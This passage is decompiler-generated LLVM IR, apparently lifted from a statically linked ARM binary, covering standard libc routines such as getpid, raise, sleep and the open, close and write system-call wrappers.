  uselistorder i32 %v0_15484, { 1, 0 }
  uselistorder i32 %v1_15468.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_15418.pre, { 2, 1, 0 }
  uselistorder i32 %v2_1541418, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 5, 4, 6 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 6, 7, 2, 3, 4, 5 }
  uselistorder i32 126, { 8, 7, 0, 2, 3, 1, 4, 5, 6 }
  uselistorder label %dec_label_pc_15488, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15470, { 1, 0 }
  uselistorder label %dec_label_pc_15458, { 1, 0 }
  uselistorder label %dec_label_pc_15438, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15420, { 1, 0 }
}

define i32 @__getpid(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15498 = load i32, i32* @r7, align 4
  store i32 %v3_15498, i32* %stack_var_-8, align 4
  %v0_1549c = call i32 @__aeabi_read_tp()
  store i32 %v0_1549c, i32* %r0.global-to-local, align 4
  %v1_154a0 = add i32 %v0_1549c, -1060
  %v2_154a0 = inttoptr i32 %v1_154a0 to i32*
  %v3_154a0 = load i32, i32* %v2_154a0, align 4
  %tmp7 = icmp slt i32 %v3_154a0, 1
  br i1 %tmp7, label %dec_label_pc_154b0, label %dec_label_pc_154d4

dec_label_pc_154b0:                               ; preds = %entry
  %v2_154a4 = icmp eq i32 %v3_154a0, 0
  br i1 %v2_154a4, label %dec_label_pc_154b4, label %dec_label_pc_154c0

dec_label_pc_154b4:                               ; preds = %dec_label_pc_154b0
  %v1_154b4 = add i32 %v0_1549c, -1064
  %v2_154b4 = inttoptr i32 %v1_154b4 to i32*
  %v3_154b4 = load i32, i32* %v2_154b4, align 4
  store i32 %v3_154b4, i32* %r0.global-to-local, align 4
  %v2_154b8 = icmp eq i32 %v3_154b4, 0
  br i1 %v2_154b8, label %bb, label %bb8

dec_label_pc_154c0:                               ; preds = %dec_label_pc_154b0
  br label %bb8

bb:                                               ; preds = %dec_label_pc_154b4
  store i32 0, i32* %v2_154b4, align 4
  %v0_154d0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_154c0, %dec_label_pc_154b4, %bb
  %v0_154d0 = phi i32 [ %v3_154b4, %dec_label_pc_154b4 ], [ %v0_1549c, %dec_label_pc_154c0 ], [ %v0_154d0.pre, %bb ]
  br label %dec_label_pc_154d4

dec_label_pc_154d4:                               ; preds = %entry, %bb8
  %v0_154d4 = phi i32 [ %v3_154a0, %entry ], [ %v0_154d0, %bb8 ]
  store i32 %v0_154d4, i32* %r0.global-to-local, align 4
  %v2_154d8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_154d8, i32* @r7, align 4
  ret i32 %v0_154d4

; uselistorder directives
  uselistorder i32 %v0_154d4, { 1, 0 }
  uselistorder i32 %v3_154a0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_154d4, { 1, 0 }
  uselistorder label %bb8, { 2, 0, 1 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_154e0 = load i32, i32* @r4, align 4
  store i32 %v3_154e0, i32* %stack_var_-20, align 4
  %v0_154e8 = call i32 @__aeabi_read_tp()
  store i32 %v0_154e8, i32* %r0.global-to-local, align 4
  %v1_154ec = add i32 %v0_154e8, -1064
  %v2_154ec = inttoptr i32 %v1_154ec to i32*
  %v3_154ec = load i32, i32* %v2_154ec, align 4
  store i32 %v3_154ec, i32* %r4.global-to-local, align 4
  %v2_154f0 = icmp eq i32 %v3_154ec, 0
  %v1_154f8 = add i32 %v0_154e8, -1060
  %v2_154f8 = inttoptr i32 %v1_154f8 to i32*
  %v3_154f8 = load i32, i32* %v2_154f8, align 4
  store i32 %v3_154f8, i32* %r0.global-to-local, align 4
  br i1 %v2_154f0, label %dec_label_pc_15500, label %dec_label_pc_15514

dec_label_pc_15500:                               ; preds = %entry
  store i32 %v3_154f8, i32* %r4.global-to-local, align 4
  store i32 %v3_154f8, i32* %v2_154ec, align 4
  %v0_1553c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb28

dec_label_pc_15514:                               ; preds = %entry
  %v5_15518 = icmp sgt i32 %v3_154f8, 0
  br i1 %v5_15518, label %bb28, label %dec_label_pc_1551c

dec_label_pc_1551c:                               ; preds = %dec_label_pc_15514
  %tmp = bitcast i32 %v3_154f8 to float
  %tmp30 = call float @fabsf(float %tmp)
  %v1_1551c = bitcast float %tmp30 to i32
  %v2_15520 = icmp eq i32 %v1_1551c, 0
  br i1 %v2_15520, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1551c
  store i32 %v3_154ec, i32* %r0.global-to-local, align 4
  br label %bb28

.thread:                                          ; preds = %dec_label_pc_1551c
  %v2_15528 = sub i32 0, %v3_154f8
  store i32 %v2_15528, i32* %r0.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %bb, %dec_label_pc_15514, %dec_label_pc_15500, %.thread
  %v0_15540 = phi i32 [ %v3_154f8, %dec_label_pc_15514 ], [ %v0_1553c.pre, %dec_label_pc_15500 ], [ %v3_154ec, %bb ], [ %v2_15528, %.thread ]
  store i32 %v0_15540, i32* %r2.global-to-local, align 4
  %tmp31 = icmp ult i32 %v0_15540, -4095
  br i1 %tmp31, label %dec_label_pc_15564, label %dec_label_pc_1554c

dec_label_pc_1554c:                               ; preds = %bb28
  %v0_15550 = call i32 @__aeabi_read_tp()
  %v3_15554 = load i16, i16* @global_var_233d0.483, align 2
  %v4_15554 = sext i16 %v3_15554 to i32
  %v0_15558 = load i32, i32* %r2.global-to-local, align 4
  %v1_15558 = sub i32 0, %v0_15558
  store i32 %v1_15558, i32* %r2.global-to-local, align 4
  %v3_1555c = add i32 %v4_15554, %v0_15550
  %v4_1555c = inttoptr i32 %v3_1555c to i32*
  store i32 %v1_15558, i32* %v4_1555c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15564

dec_label_pc_15564:                               ; preds = %bb28, %dec_label_pc_1554c
  %v0_15568 = phi i32 [ %v0_15540, %bb28 ], [ -1, %dec_label_pc_1554c ]
  %v3_15564 = icmp eq i32 %v0_15568, -1
  store i32 %v0_15568, i32* %r5.global-to-local, align 4
  br i1 %v3_15564, label %dec_label_pc_15570, label %dec_label_pc_155b8

dec_label_pc_15570:                               ; preds = %dec_label_pc_15564
  %v0_15574 = call i32 @__aeabi_read_tp()
  store i32 %v0_15574, i32* %r0.global-to-local, align 4
  %v3_15578 = load i16, i16* @global_var_233d0.483, align 2
  %v4_15578 = sext i16 %v3_15578 to i32
  %v2_1557c = add i32 %v4_15578, %v0_15574
  %v3_1557c = inttoptr i32 %v2_1557c to i32*
  %v4_1557c = load i32, i32* %v3_1557c, align 4
  %v7_15580 = icmp eq i32 %v4_1557c, 38
  br i1 %v7_15580, label %dec_label_pc_1558c, label %dec_label_pc_15570.dec_label_pc_155b8_crit_edge

dec_label_pc_15570.dec_label_pc_155b8_crit_edge:  ; preds = %dec_label_pc_15570
  %v0_155b8.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_155b8

dec_label_pc_1558c:                               ; preds = %dec_label_pc_15570
  %v0_1558c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1558c, i32* %r0.global-to-local, align 4
  %tmp32 = icmp ugt i32 %v0_1558c, -4096
  br i1 %tmp32, label %bb29, label %.thread22

bb29:                                             ; preds = %dec_label_pc_1558c
  %v5_155a4 = sub i32 0, %v0_1558c
  store i32 %v5_155a4, i32* %r2.global-to-local, align 4
  %v7_155a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_155b0.655 to i32), i32 56864) to i32*), align 4
  %v4_155ac = load i32, i32* %r5.global-to-local, align 4
  store i32 %v4_155ac, i32* %r0.global-to-local, align 4
  %v7_155b0 = add i32 %v7_155a8, %v0_15574
  %v8_155b0 = inttoptr i32 %v7_155b0 to i32*
  store i32 %v5_155a4, i32* %v8_155b0, align 4
  %v0_155b4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread22

.thread22:                                        ; preds = %dec_label_pc_1558c, %bb29
  %v0_155b4 = phi i32 [ %v0_155b4.pre, %bb29 ], [ %v0_1558c, %dec_label_pc_1558c ]
  store i32 %v0_155b4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_155b8

dec_label_pc_155b8:                               ; preds = %dec_label_pc_15570.dec_label_pc_155b8_crit_edge, %dec_label_pc_15564, %.thread22
  %v0_155b8 = phi i32 [ %v0_155b8.pre, %dec_label_pc_15570.dec_label_pc_155b8_crit_edge ], [ %v0_15568, %dec_label_pc_15564 ], [ %v0_155b4, %.thread22 ]
  store i32 %v0_155b8, i32* %r0.global-to-local, align 4
  %v2_155bc = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_155bc, i32* @r4, align 4
  ret i32 %v0_155b8

; uselistorder directives
  uselistorder i32 %v0_155b8, { 1, 0 }
  uselistorder i32 %v0_1558c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_15540, { 2, 0, 1 }
  uselistorder i32 %v3_154f8, { 2, 1, 0, 5, 4, 3, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 38, { 11, 3, 0, 4, 1, 5, 2, 6, 7, 8, 9, 10 }
  uselistorder i32 -1060, { 1, 0 }
  uselistorder i32 -1064, { 1, 0 }
  uselistorder label %dec_label_pc_155b8, { 2, 0, 1 }
  uselistorder label %.thread22, { 1, 0 }
  uselistorder label %dec_label_pc_15564, { 1, 0 }
  uselistorder label %bb28, { 3, 0, 1, 2 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_155d0 = load i32, i32* @r4, align 4
  %v6_155d0 = load i32, i32* @r5, align 4
  %v9_155d0 = load i32, i32* @r6, align 4
  %v12_155d0 = load i32, i32* @r7, align 4
  %v15_155d0 = load i32, i32* @lr, align 4
  store i32 0, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_155e0 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* @r7, align 4
  store i32 %arg1, i32* %stack_var_-32, align 4
  br i1 %v2_155e0, label %dec_label_pc_155f4, label %dec_label_pc_15668

dec_label_pc_155f4:                               ; preds = %entry
  %v0_155f4 = call i32 @__aeabi_read_tp()
  %v1_155f8 = add i32 %v0_155f4, -1036
  %v2_155f8 = inttoptr i32 %v1_155f8 to i32*
  %v3_155f8 = load i32, i32* %v2_155f8, align 4
  %v1_155fc = and i32 %v3_155f8, -71
  %v2_15600 = icmp ugt i32 %v1_155fc, 7
  store i1 %v2_15600, i1* %cpsr_c.global-to-local, align 1
  %v7_15600 = icmp eq i32 %v1_155fc, 8
  %v1_15604 = add i32 %v0_155f4, -1168
  store i32 %v1_15604, i32* @r5, align 4
  br i1 %v7_15600, label %dec_label_pc_1560c, label %dec_label_pc_156e0

dec_label_pc_1560c:                               ; preds = %dec_label_pc_155f4
  %v2_15610 = add i32 %v0_155f4, -624
  %v3_15610 = inttoptr i32 %v2_15610 to i32*
  store i32 -1, i32* %v3_15610, align 4
  %v0_15614 = load i32, i32* @r5, align 4
  %v1_15614 = add i32 %v0_15614, 132
  store i32 %v1_15614, i32* @r6, align 4
  br label %dec_label_pc_15618

dec_label_pc_15618:                               ; preds = %dec_label_pc_1564c.dec_label_pc_15618_crit_edge, %dec_label_pc_1560c
  %v0_1561c = phi i32 [ %v0_1561c.pre, %dec_label_pc_1564c.dec_label_pc_15618_crit_edge ], [ %v1_15614, %dec_label_pc_1560c ]
  %v0_15618 = phi i32 [ %v0_15654, %dec_label_pc_1564c.dec_label_pc_15618_crit_edge ], [ %v0_15614, %dec_label_pc_1560c ]
  %v1_15618 = add i32 %v0_15618, 132
  %v2_15618 = inttoptr i32 %v1_15618 to i32*
  %v3_15618 = load i32, i32* %v2_15618, align 4
  store i32 %v0_1561c, i32* %r2.global-to-local, align 4
  store i32 %v3_15618, i32* @r4, align 4
  %v1_1562830 = inttoptr i32 %v0_1561c to i32*
  %v2_1562831 = load i32, i32* %v1_1562830, align 4
  %v3_1562c33 = icmp uge i32 %v2_1562831, %v3_15618
  store i1 %v3_1562c33, i1* %cpsr_c.global-to-local, align 1
  %v9_1562c39 = icmp eq i32 %v2_1562831, %v3_15618
  br i1 %v9_1562c39, label %dec_label_pc_15634, label %dec_label_pc_1564c

dec_label_pc_15634:                               ; preds = %dec_label_pc_15618, %dec_label_pc_15634.dec_label_pc_15628_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_15644 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15644, label %dec_label_pc_15648, label %dec_label_pc_15634.dec_label_pc_15628_crit_edge

dec_label_pc_15634.dec_label_pc_15628_crit_edge:  ; preds = %dec_label_pc_15634
  %v0_15628.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1562c.pre = load i32, i32* @r4, align 4
  %v1_15628 = inttoptr i32 %v0_15628.pre to i32*
  %v2_15628 = load i32, i32* %v1_15628, align 4
  %v3_1562c = icmp uge i32 %v2_15628, %v1_1562c.pre
  store i1 %v3_1562c, i1* %cpsr_c.global-to-local, align 1
  %v9_1562c = icmp eq i32 %v2_15628, %v1_1562c.pre
  br i1 %v9_1562c, label %dec_label_pc_15634, label %dec_label_pc_1564c

dec_label_pc_15648:                               ; preds = %dec_label_pc_15634
  %v0_15648 = load i32, i32* @r4, align 4
  br label %dec_label_pc_1564c

dec_label_pc_1564c:                               ; preds = %dec_label_pc_15618, %dec_label_pc_15634.dec_label_pc_15628_crit_edge, %dec_label_pc_15648
  %v0_1564c = phi i32 [ %v0_15648, %dec_label_pc_15648 ], [ %v2_1562831, %dec_label_pc_15618 ], [ %v2_15628, %dec_label_pc_15634.dec_label_pc_15628_crit_edge ]
  %v1_1564c = phi i32 [ %v0_15648, %dec_label_pc_15648 ], [ %v3_15618, %dec_label_pc_15618 ], [ %v1_1562c.pre, %dec_label_pc_15634.dec_label_pc_15628_crit_edge ]
  %v3_1564c = icmp uge i32 %v0_1564c, %v1_1564c
  store i1 %v3_1564c, i1* %cpsr_c.global-to-local, align 1
  %v9_1564c = icmp eq i32 %v0_1564c, %v1_1564c
  br i1 %v9_1564c, label %dec_label_pc_15654, label %dec_label_pc_1564c.dec_label_pc_15618_crit_edge

dec_label_pc_1564c.dec_label_pc_15618_crit_edge:  ; preds = %dec_label_pc_1564c
  %v0_15654 = load i32, i32* @r5, align 4
  %v0_1561c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_15618

dec_label_pc_15654:                               ; preds = %dec_label_pc_1564c
  %v0_1565c = load i32, i32* @r7, align 4
  %v2_1565c = add i32 %v0_1565c, 116
  %v3_1565c = inttoptr i32 %v2_1565c to i32*
  %v4_1565c = load i32, i32* %v3_1565c, align 4
  store i32 87656, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1565c)
  %v0_15670.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15668

dec_label_pc_15668:                               ; preds = %entry, %dec_label_pc_15654
  %v0_15670 = phi i32 [ 0, %entry ], [ %v0_15670.pre, %dec_label_pc_15654 ]
  %v2_15674 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_15674, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10000.35 to i32), i32* %stack_var_-40, align 4
  %v3_15680 = call i32 @__libc_sigaction(i32 17, i32 %v0_15670, i32 %v2_15674)
  %v3_15684 = load i32, i32* %stack_var_-60, align 4
  %v2_15688 = icmp ne i32 %v3_15684, 0
  store i1 %v2_15688, i1* %cpsr_c.global-to-local, align 1
  %v7_15688 = icmp eq i32 %v3_15684, 1
  br i1 %v7_15688, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_15668
  %v3_1568c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_1568c, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_15668, %bb
  call void @__pseudo_cond_branch(i1 %v7_15688, i32 ptrtoint (i32* @global_var_12544.660 to i32))
  %v2_1569c = ptrtoint i32* %stack_var_-32 to i32
  %v2_156a4 = call i32 @__libc_nanosleep(i32 %v2_1569c, i32 %v2_1569c)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_156a8 = icmp eq i32 %v2_156a4, 0
  br i1 %v2_156a8, label %bb26, label %bb25

bb25:                                             ; preds = %.thread1
  store i32 0, i32* @r1, align 4
  store i32 499999999, i32* %r2.global-to-local, align 4
  %v3_156bc = load i32, i32* %stack_var_-32, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br label %bb26

bb26:                                             ; preds = %.thread1, %bb25
  %storemerge = phi i32 [ %v3_156bc, %bb25 ], [ 0, %.thread1 ]
  store i32 %storemerge, i32* @r4, align 4
  %v3_156cc = load i32, i32* %stack_var_-40, align 4
  %v1_156d0 = and i32 %v3_156cc, ptrtoint (i32* @global_var_10000.35 to i32)
  store i32 %v1_156d0, i32* %r2.global-to-local, align 4
  %v2_156d0 = icmp eq i32 %v1_156d0, 0
  br i1 %v2_156d0, label %bb27, label %.thread5

bb27:                                             ; preds = %bb26
  %v3_156d8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_156d8, i32* @r1, align 4
  br label %.thread5

.thread5:                                         ; preds = %bb26, %bb27
  call void @__pseudo_cond_branch(i1 %v2_156d0, i32 ptrtoint (i32* @global_var_12544.660 to i32))
  br label %dec_label_pc_156e0

dec_label_pc_156e0:                               ; preds = %dec_label_pc_155f4, %.thread5
  %v0_156e0 = load i32, i32* @r4, align 4
  store i32 %v3_155d0, i32* @r4, align 4
  store i32 %v6_155d0, i32* @r5, align 4
  store i32 %v9_155d0, i32* @r6, align 4
  store i32 %v12_155d0, i32* @r7, align 4
  store i32 %v15_155d0, i32* @lr, align 4
  ret i32 %v0_156e0

; uselistorder directives
  uselistorder i32 %v0_15648, { 1, 0 }
  uselistorder i32 %v1_1562c.pre, { 0, 2, 1 }
  uselistorder i32* %stack_var_-40, { 2, 0, 3, 1 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_sigaction, { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_10000.35 to i32), { 3, 0, 1, 2, 4, 5 }
  uselistorder label %dec_label_pc_156e0, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_15668, { 1, 0 }
  uselistorder label %dec_label_pc_1564c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15634, { 1, 0 }
}

define i32 @function_156f4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_156f4:
  %v0_156f4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_156f4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_156f4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_156f4, %bb
  %v3_15700 = phi i32 [ %arg1, %dec_label_pc_156f4 ], [ 0, %bb ]
  ret i32 %v3_15700

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI___close_nocancel() local_unnamed_addr {
entry:
  %v0_15714 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_15714, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_15714 = load i32, i32* @r0, align 4
  ret i32 %v2_15714

bb1:                                              ; preds = %entry
  %v0_15718 = call i32 @__syscall_error()
  ret i32 %v0_15718
}

define i32 @__GI___libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15724 = load i32, i32* @global_var_26660.663, align 4
  %v2_15728 = icmp eq i32 %v3_15724, 0
  store i1 %v2_15728, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15728, label %dec_label_pc_15730, label %entry.dec_label_pc_1574c_crit_edge

entry.dec_label_pc_1574c_crit_edge:               ; preds = %entry
  %v3_1574c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1574c

dec_label_pc_15730:                               ; preds = %entry
  %v0_15730 = load i32, i32* @r7, align 4
  store i32 %v0_15730, i32* @ip, align 4
  %v0_15740 = load i32, i32* @r0, align 4
  %v2_15740 = icmp ugt i32 %v0_15740, -4097
  %v7_15740 = icmp eq i32 %v0_15740, -4096
  store i1 %v7_15740, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15740, label %bb7, label %bb

bb:                                               ; preds = %bb9, %bb8, %dec_label_pc_1574c, %dec_label_pc_15730
  %merge = phi i32 [ %v0_15740, %dec_label_pc_15730 ], [ %v0_15770, %dec_label_pc_1574c ], [ %v0_15780, %bb8 ], [ %v6_15790, %bb9 ]
  ret i32 %merge

bb7:                                              ; preds = %dec_label_pc_15730
  %v0_15748 = call i32 @__syscall_error()
  br label %dec_label_pc_1574c

dec_label_pc_1574c:                               ; preds = %entry.dec_label_pc_1574c_crit_edge, %bb7
  %v3_1574c = phi i32 [ %v3_1574c.pre, %entry.dec_label_pc_1574c_crit_edge ], [ %v0_15748, %bb7 ]
  %v9_1574c = load i32, i32* @r7, align 4
  store i32 %v9_1574c, i32* %stack_var_-8, align 4
  %v12_1574c = load i32, i32* @lr, align 4
  %v0_15750 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_15750, i32* @ip, align 4
  store i32 %v3_1574c, i32* @r7, align 4
  %v1_1576c = call i32 @__libc_disable_asynccancel(i32 %v0_15750)
  %v0_15770 = load i32, i32* @r7, align 4
  store i32 %v0_15770, i32* @r0, align 4
  %v2_15774 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15774, i32* @r7, align 4
  store i32 %v12_1574c, i32* @lr, align 4
  %v2_15778 = icmp ugt i32 %v0_15770, -4097
  %v7_15778 = icmp eq i32 %v0_15770, -4096
  store i1 %v7_15778, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15778, label %bb8, label %bb

bb8:                                              ; preds = %dec_label_pc_1574c
  %v0_15780 = call i32 @__syscall_error()
  %v0_15790 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15790, label %bb9, label %bb

bb9:                                              ; preds = %bb8
  %v1_15790 = load i32, i32* @r1, align 4
  %v2_15790 = load i32, i32* @r4, align 4
  %v5_15790 = udiv i32 %v2_15790, 536870912
  %v6_15790 = and i32 %v5_15790, %v1_15790
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_15770, { 0, 2, 3, 1 }
  uselistorder i32 %v0_15740, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1574c, { 1, 0 }
}

define i32 @__GI___open_nocancel() local_unnamed_addr {
entry:
  %v0_157a4 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_157a4, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_157a4 = load i32, i32* @r0, align 4
  ret i32 %v2_157a4

bb1:                                              ; preds = %entry
  %v0_157a8 = call i32 @__syscall_error()
  ret i32 %v0_157a8
}

define i32 @__libc_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_157b4 = load i32, i32* @global_var_26660.663, align 4
  %v2_157b8 = icmp eq i32 %v3_157b4, 0
  store i1 %v2_157b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_157b8, label %dec_label_pc_157c0, label %entry.dec_label_pc_157dc_crit_edge

entry.dec_label_pc_157dc_crit_edge:               ; preds = %entry
  %v3_157dc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_157dc

dec_label_pc_157c0:                               ; preds = %entry
  %v0_157d0 = load i32, i32* @r0, align 4
  %v2_157d0 = icmp ugt i32 %v0_157d0, -4097
  %v7_157d0 = icmp eq i32 %v0_157d0, -4096
  store i1 %v7_157d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_157d0, label %bb9, label %bb

bb:                                               ; preds = %bb11, %bb10, %dec_label_pc_157dc, %dec_label_pc_157c0
  %merge = phi i32 [ %v0_157d0, %dec_label_pc_157c0 ], [ %v0_15800, %dec_label_pc_157dc ], [ %v0_15810, %bb10 ], [ %v9_15820, %bb11 ]
  ret i32 %merge

bb9:                                              ; preds = %dec_label_pc_157c0
  %v0_157d8 = call i32 @__syscall_error()
  br label %dec_label_pc_157dc

dec_label_pc_157dc:                               ; preds = %entry.dec_label_pc_157dc_crit_edge, %bb9
  %v3_157dc = phi i32 [ %v3_157dc.pre, %entry.dec_label_pc_157dc_crit_edge ], [ %v0_157d8, %bb9 ]
  store i32 %v3_157dc, i32* %stack_var_-24, align 4
  %v9_157dc = load i32, i32* @r2, align 4
  %v12_157dc = load i32, i32* @r3, align 4
  %v15_157dc = load i32, i32* @r7, align 4
  store i32 %v15_157dc, i32* %stack_var_-8, align 4
  %v18_157dc = load i32, i32* @lr, align 4
  %v0_157e0 = call i32 @__libc_enable_asynccancel()
  %v2_157e8 = load i32, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %v9_157dc, i32* @r2, align 4
  store i32 %v12_157dc, i32* @r3, align 4
  store i32 %v2_157e8, i32* @r7, align 4
  %v1_157fc = call i32 @__libc_disable_asynccancel(i32 %v0_157e0)
  %v0_15800 = load i32, i32* @r7, align 4
  store i32 %v0_15800, i32* @r0, align 4
  %v2_15804 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15804, i32* @r7, align 4
  store i32 %v18_157dc, i32* @lr, align 4
  %v2_15808 = icmp ugt i32 %v0_15800, -4097
  %v7_15808 = icmp eq i32 %v0_15800, -4096
  store i1 %v7_15808, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15808, label %bb10, label %bb

bb10:                                             ; preds = %dec_label_pc_157dc
  %v0_15810 = call i32 @__syscall_error()
  %v0_15820 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15820, label %bb11, label %bb

bb11:                                             ; preds = %bb10
  %v1_15820 = load i32, i32* @r1, align 4
  %v2_15820 = load i32, i32* @r4, align 4
  %v3_15820 = load i32, i32* @lr, align 4
  %v8_15820 = shl i32 %v2_15820, %v3_15820
  %v9_15820 = and i32 %v8_15820, %v1_15820
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_15800, { 0, 2, 3, 1 }
  uselistorder i32 %v0_157d0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_157dc, { 1, 0 }
}

define i32 @__GI___write_nocancel() local_unnamed_addr {
entry:
  %v0_15834 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_15834, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_15834 = load i32, i32* @r0, align 4
  ret i32 %v2_15834

bb1:                                              ; preds = %entry
  %v0_15838 = call i32 @__syscall_error()
  ret i32 %v0_15838
}

define i32 @__GI___libc_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15844 = load i32, i32* @global_var_26660.663, align 4
  %v2_15848 = icmp eq i32 %v3_15844, 0
  store i1 %v2_15848, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15848, label %dec_label_pc_15850, label %entry.dec_label_pc_1586c_crit_edge

entry.dec_label_pc_1586c_crit_edge:               ; preds = %entry
  %v3_1586c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1586c

dec_label_pc_15850:                               ; preds = %entry
  %v0_15860 = load i32, i32* @r0, align 4
  %v2_15860 = icmp ugt i32 %v0_15860, -4097
  %v7_15860 = icmp eq i32 %v0_15860, -4096
  store i1 %v7_15860, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15860, label %bb9, label %bb

bb:                                               ; preds = %bb11, %bb10, %dec_label_pc_1586c, %dec_label_pc_15850
  %merge = phi i32 [ %v0_15860, %dec_label_pc_15850 ], [ %v0_15890, %dec_label_pc_1586c ], [ %v0_158a0, %bb10 ], [ %v6_158b0, %bb11 ]
  ret i32 %merge

bb9:                                              ; preds = %dec_label_pc_15850
  %v0_15868 = call i32 @__syscall_error()
  br label %dec_label_pc_1586c

dec_label_pc_1586c:                               ; preds = %entry.dec_label_pc_1586c_crit_edge, %bb9
  %v3_1586c = phi i32 [ %v3_1586c.pre, %entry.dec_label_pc_1586c_crit_edge ], [ %v0_15868, %bb9 ]
  %v12_1586c = load i32, i32* @r3, align 4
  %v15_1586c = load i32, i32* @r7, align 4
